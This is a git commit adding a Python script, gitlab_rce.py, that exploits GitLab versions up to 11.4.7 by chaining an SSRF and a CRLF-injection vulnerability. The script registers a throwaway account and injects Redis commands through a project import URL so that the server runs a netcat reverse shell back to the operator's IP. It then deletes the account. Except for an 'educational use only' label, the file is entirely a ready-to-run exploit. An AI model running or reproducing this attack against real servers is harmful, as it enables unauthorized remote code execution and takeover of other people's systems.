13dbc3bcad9a0fe103f71544a6f121a87bdd96e5
pyrat3 <67259802+pyrat3@users.noreply.github.com>
2020-12-13 01:49:32 +0100

    Create gitlab_rce.py

---
+++ gitlab_rce.py
@@ -0,0 +1,121 @@
+"""
+Gitlab RCE version <= 11.4.7 - EDUCATIONAL USE ONLY
+CVEs: CVE-2018-19571 (SSRF) + CVE-2018-19585 (CRLF)
+"""
+
+from html.parser import HTMLParser
+import random
+import string
+import sys
+import time
+
+import requests
+
+
+class GitlabRCE:
+    def __init__(self, gitlab_url, local_ip):
+        self.url = gitlab_url
+        self.local_ip = local_ip
+        self.port = 42069
+        self.session = requests.session()
+        self.username = ""
+        self.password = ""
+
+    def get_authenticity_token(self, url, i=-1):
+        result = self.session.get(url)
+        parser = GitlabParse()
+        token = parser.feed(result.text, i)
+        return token
+
+    def randomize(self):
+        sequence = string.ascii_letters + string.digits
+        random_list = random.choices(sequence, k=10)
+        random_string = "".join(random_list)
+        return random_string
+
+    def register_user(self):
+        authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in")
+        self.username = self.randomize()
+        self.password = self.randomize()
+        email = "{}@gmail.com".format(self.username)
+        data = {"new_user[email]": email, "new_user[email_confirmation]": email, "new_user[username]": self.username,
+                "new_user[name]": self.username, "new_user[password]": self.password,
+                "authenticity_token": authenticity_token}
+        result = self.session.post(self.url + "/users", data=data)
+        print("registering {}:{} - {}".format(self.username, self.password, result.status_code))
+
+    def login_user(self):
+        authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in", 0)
+        data = {"authenticity_token": authenticity_token, "user[login]": self.username, "user[password]": self.password}
+        result = self.session.post(self.url + "/users/sign_in", data=data)
+        print(result.status_code)
+
+    def delete_user(self):
+        authenticity_token = self.get_authenticity_token(self.url + "/profile/account")
+        data = {"authenticity_token": authenticity_token, "_method": "delete", "password": self.password}
+        result = self.session.post(self.url + "/users", data=data)
+        print("delete user {} - {}".format(self.username, result.status_code))
+
+    def exploit_project_creation(self, payload):
+        authenticity_token = self.get_authenticity_token(self.url + "/projects/new")
+        project = self.randomize()
+        payload_template = """git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|{payload} \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
+ exec
+ exec
+ exec"""
+        # using replace for formating is shit!! too bad...
+        payload = payload_template.replace("{payload}", payload)
+        data = {"authenticity_token": authenticity_token, "project[import_url]": payload,
+                "project[ci_cd_only]": "false", "project[name]": project,
+                "project[path]": project, "project[visibility_level]": "0",
+                "project[description]": "all your base are belong to us"}
+        result = self.session.post(self.url + "/projects", data=data)
+        print("hacking in progress - {}".format(result.status_code))
+
+    def main(self):
+        self.register_user()
+        self.exploit_project_creation("nc {} {} -e /bin/bash".format(self.local_ip, self.port))
+        time.sleep(10)
+        self.delete_user()
+
+
+class GitlabParse(HTMLParser):
+    def __init__(self):
+        super(GitlabParse, self).__init__()
+        self.tokens = []
+        self.current_name = ""
+
+    def handle_starttag(self, tag, attrs):
+        if tag == "input":
+            for name, value in attrs:
+                if self.current_name == "authenticity_token" and name == "value":
+                    self.tokens.append(value)
+                self.current_name = value
+        elif tag == "meta":
+            for name, value in attrs:
+                if self.current_name == "csrf-token":
+                    self.tokens.append(value)
+                self.current_name = value
+
+    def feed(self, data, i):
+        super(GitlabParse, self).feed(data)
+        return self.tokens[i]
+
+
+def run():
+    args = sys.argv
+    if len(args) != 3:
+        print("usage: {} target-url(http://gitlab:port) local-ip".format(args[0]))
+        return
+    else:
+        target_url = args[1]
+        local_ip = args[2]
+        c = GitlabRCE(target_url, local_ip)
+        input("Start a listener on port {port} and hit enter (nc -vlnp {port})".format(port=c.port))
+        c.main()
+
+
+run()
